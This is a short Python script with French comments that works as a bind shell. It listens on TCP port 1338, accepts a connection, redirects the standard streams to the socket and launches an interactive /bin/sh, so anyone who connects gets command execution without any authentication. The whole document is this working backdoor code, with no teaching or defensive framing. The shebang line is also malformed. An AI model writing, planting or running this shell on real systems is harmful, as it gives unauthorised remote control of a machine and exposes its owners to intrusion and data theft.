#-*- coding:UTF-8 -*
#!/bin/usr/env python

import os
import socket
import subprocess

host = ''  # IP de l'ordinateur localhost si vide
port = 1338  # Port d'écoute
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creation du socket en IPv4 et TCP

try:  # Reservation du port ci-dessus
    s.bind((host, port))
    print("Server started\n")
except socket.error as exeption:
    print(exeption)
    exit(0)

s.listen(1)  # Attente 1 connection
client, address = s.accept()  # Acceptation de la connection
print(address)

# Envoie du message de bienvenue
welcomeMessage = "Hello\n"
client.send(bytes(welcomeMessage, encoding='utf8'))

for f in range(3):  # Redirection des entrées sorties stdin, stdout, stderr
    os.dup2(client.fileno(), f)

# Ouverture d'un shell en mode interactif
p = subprocess.call(["/bin/sh", "-i"])

# Fermeture du socket après avoir quitter le shell
s.close()
